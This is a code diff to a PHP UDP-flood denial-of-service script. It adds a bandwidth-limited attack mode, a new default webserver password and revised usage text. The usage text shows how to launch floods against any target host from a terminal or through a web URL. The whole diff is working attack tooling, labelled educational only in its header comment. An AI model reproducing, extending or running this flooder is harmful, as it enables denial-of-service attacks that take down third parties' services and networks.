@@ -11,6 +11,7 @@
  * @author Smaury
  * @author moty66  
  * @author AxissXs
+ * @author Hi-ImKyle
  * @license http://www.gnu.org/licenses/old-licenses/gpl-2.0.txt GPLv2 
  * 
  * This tool is written on educational purpose, please use it on your own good faith.
@@ -34,8 +35,8 @@
 // Current version
 define('DDOS_VERSION',				'0.2' );
 
-// MD5 Password to be used when the script is executed from the webserver, default is "apple"
-define('DDOS_PASSWORD',				'1f3870be274f6c49b3e31a0c6728957f' );
+// MD5 Password to be used when the script is executed from the webserver, default is "default"
+define('DDOS_PASSWORD',				'c21f969b5f03d33d43e04f8f136e7682' );
 
 // Script max execution time
 define('DDOS_MAX_EXECUTION_TIME',0);
@@ -79,16 +80,17 @@ class DDoS {
 	 * @var array
 	 */
 	private $params = array(
-			'host' => 	'',
-			'port' => 	'',
-			'packet' => '',
-			'time'	=> 	'',
-			'pass'	=> 	'',
-			'bytes' =>	'',
-			'verbose'=> DDOS_LOG_INFO,
-			'format'=> 'text',
-			'output'=> '',
-			'interval'=>'1'
+			'host' => 		'',
+			'port' => 		'',
+			'packet' => 	'',
+			'time'	=> 		'',
+			'pass'	=> 		'',
+			'bytes' =>		'',
+			'bandwidth' =>	'',
+			'verbose'=> 	DDOS_LOG_INFO,
+			'format'=> 		'text',
+			'output'=> 		'',
+			'interval'=>	'1'
 	);
 	
 	
@@ -168,19 +170,20 @@ class DDoS {
 	public function usage() {
 		$this->println("EXAMPLES:");
 		$this->println("from terminal:  php ./".basename(__FILE__)." host=TARGET port=PORT time=SECONDS packet=NUMBER bytes=NUMBER");
-		$this->println("from webserver: http://localhost/ddos.php?pass=PASSWORD&host=TARGET&port=PORT&time=SECONDS&packet=NUMBER&bytes=NUMBER");
+		$this->println("from webserver: http://localhost/index.php?pass=PASSWORD&host=TARGET&port=PORT&time=SECONDS&packet=NUMBER&bytes=NUMBER");
 		$this->println();
 		$this->println("PARAMETERS:");
-		$this->println("help	Print this help summary page");
-		$this->println("host	REQUIRED specify IP or HOSTNAME");
-		$this->println("pass	REQUIRED only if used from webserver");
-		$this->println("port	OPTIONAL if not specified a random ports will be selected");
-		$this->println("time	OPTIONAL seconds to keep the DDoS alive, required if packet is not used");
-		$this->println("packet	OPTIONAL number of packets to send to the target, required if time is not used");
-		$this->println("bytes	OPTIONAL size of the packet to send, defualt: ".DDOS_DEFAULT_PACKET_SIZE);
-		$this->println("format	OPTIONAL output format, (text,json,xml), default: text");
-		$this->println("output	OPTIONAL logfile, save the output to file");
-		$this->println("verbose	OPTIONAL 0: debug, 1:info, 2:notice, 3:warning, 4:error, default: info");
+		$this->println("help		Print this help summary page");
+		$this->println("host		REQUIRED specify IP or HOSTNAME");
+		$this->println("pass		REQUIRED only if used from webserver");
+		$this->println("port		OPTIONAL if not specified a random ports will be selected");
+		$this->println("time		OPTIONAL seconds to keep the DDoS alive, if this isn't specified bandwidth will be checked");
+		$this->println("bandwith	OPTIONAL max bandwitdh to use, if this isn't specified packet will be checked");
+		$this->println("packet		OPTIONAL number of packets to send to the target, if this isn't specified the script ends");
+		$this->println("bytes		OPTIONAL size of the packet to send, defualt: ".DDOS_DEFAULT_PACKET_SIZE);
+		$this->println("format		OPTIONAL output format, (text,json,xml), default: text");
+		$this->println("output		OPTIONAL logfile, save the output to file");
+		$this->println("verbose		OPTIONAL 0: debug, 1:info, 2:notice, 3:warning, 4:error, default: info");
 		$this->println();
 		$this->println("Note: 	If both time and packet are specified, only time will be used");
 		$this->println();
@@ -198,7 +201,10 @@ class DDoS {
 		
 		$packets = 0;
 		$message = str_repeat(DDOS_DEFAULT_BYTE, $this->get_param('bytes'));
-		
+		$bytesPerMessage = $this->get_param('bytes');
+		$bytesSent = 0;
+		$maxBytesToSend = $this->get_param('bandwidth') * 1024 * 1000;
+
 		$this->log('DDos UDP flood started');
 		
 		// Time based attack
@@ -209,6 +215,25 @@ class DDoS {
 		
 			while(time() < $max_time){
 				$packets++;
+				$this->log('Sending packet #'.$packets,DDOS_LOG_DEBUG);
+				$this->udp_connect($this->get_param('host'),$this->get_param('port'),$message);
+				usleep($this->get_param('interval') * 100);
+			}
+			$timeStr = $exec_time. ' second';
+			if(1 != $exec_time) {
+				$timeStr .= 's';
+			}
+
+		}
+		// Bandwidth based attack, only send so many bytes then end
+		else if($this->get_param('bandwidth')){
+
+			$exec_time = $this->get_param('time');
+		
+
+			while($bytesSent < $maxBytesToSend){
+				$packets++;
+				$bytesSent += $bytesPerMessage;
 				$this->log('Sending packet #'.$packets,DDOS_LOG_DEBUG);
 				$this->udp_connect($this->get_param('host'),$this->get_param('port'),$message);
 				usleep($this->get_param('interval') * 100);
@@ -250,9 +275,13 @@ class DDoS {
 		unset($data['packet']);
 		unset($data['time']);
 		
+		if($exec_time == 0)
+			$exec_time = 1;
+
 		$data['port'] = 0 == $data['port'] ? 'Radom ports' : $data['port'];
 		$data['total_packets'] = $packets;
 		$data['total_size'] = $this->format_bytes($packets*$data['bytes']);
+		$data['max_size~'] = $this->format_bytes($this->get_param('bandwidth') * 1024 * 1000);
 		$data['duration'] = $timeStr;
 		$data['average'] = round($packets/$exec_time, 2);
 		
@@ -366,8 +395,8 @@ class DDoS {
 			$this->set_param('bytes',DDOS_DEFAULT_PACKET_SIZE);
 		}
 		
-		if(!is_numeric($this->get_param('time')) && !is_numeric($this->get_param('packet'))) {
-			$this->set_output("Missing parameter time or packet", DDOS_OUTPUT_STATUS_ERROR);
+		if(!is_numeric($this->get_param('time')) && !is_numeric($this->get_param('packet')) && !is_numeric($this->get_param('bandwidth'))) {
+			$this->set_output("Missing parameter time or packet or bandwidth", DDOS_OUTPUT_STATUS_ERROR);
 			$this->print_output();
 			exit(1);
 		}
